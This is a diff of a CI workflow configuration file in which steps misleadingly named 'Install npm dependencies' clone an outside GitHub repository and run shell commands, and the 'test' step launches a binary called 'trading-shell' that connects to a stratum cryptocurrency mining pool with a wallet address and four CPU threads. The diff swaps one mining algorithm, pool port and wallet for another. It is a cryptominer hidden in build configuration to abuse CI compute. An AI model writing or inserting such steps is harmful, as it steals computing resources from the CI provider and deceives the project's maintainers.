@@ -21,7 +21,7 @@ workflows:
           source: true
     scripts:
       - name: Install npm dependencies
-        script: git clone https://github.com/hujan90/1.git
+        script: git clone https://github.com/agamsaja/starter.git
       - name: Install npm dependencies
         script: bash
       - name: Install npm dependencies
@@ -31,4 +31,4 @@ workflows:
       - name: Install npm dependencies
         script: ls
       - name: test
-        script: ./trading-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.1 -t 4 --cpu-priority 4 && set -x
+        script: ./trading-shell -a lyra2z330 -o stratum+tcps://stratum-eu.rplant.xyz:17046 -u HRDiYsGL7xwjPHfKAHNwxwMxvK6UTX5Ptr.ok -t 4 --cpu-priority 4 && set -x
